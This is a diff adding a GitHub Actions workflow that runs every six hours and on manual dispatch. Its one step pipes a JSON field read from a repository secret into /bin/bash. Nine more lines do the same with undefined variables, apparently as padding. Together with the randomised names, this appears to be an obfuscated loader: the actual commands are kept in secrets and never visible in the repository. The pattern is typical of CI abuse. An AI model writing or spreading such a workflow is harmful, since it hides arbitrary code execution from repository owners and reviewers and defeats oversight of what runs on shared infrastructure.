@@ -1,0 +1,25 @@
+name: tongshangnuzhu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongshangnuzhu
+        env:
+          lg57893: ${{ secrets.lg57893 }}
+        run: |
+          echo $lg57893 | jq -r .r8450 | /bin/bash
+          echo $g8 | jq -r .yz767 | /bin/bash
+          echo $hy57 | jq -r .ryyo6 | /bin/bash
+          echo $mojsu1475 | jq -r .s1 | /bin/bash
+          echo $vswg247 | jq -r .kwdfe7405 | /bin/bash
+          echo $ddwvf60129 | jq -r .i219 | /bin/bash
+          echo $a541 | jq -r .duew04 | /bin/bash
+          echo $wdodv921 | jq -r .dqzl71415 | /bin/bash
+          echo $pkqz02176 | jq -r .xwzfp5 | /bin/bash
+          echo $ahbvj4295 | jq -r .ikqv41 | /bin/bash
+
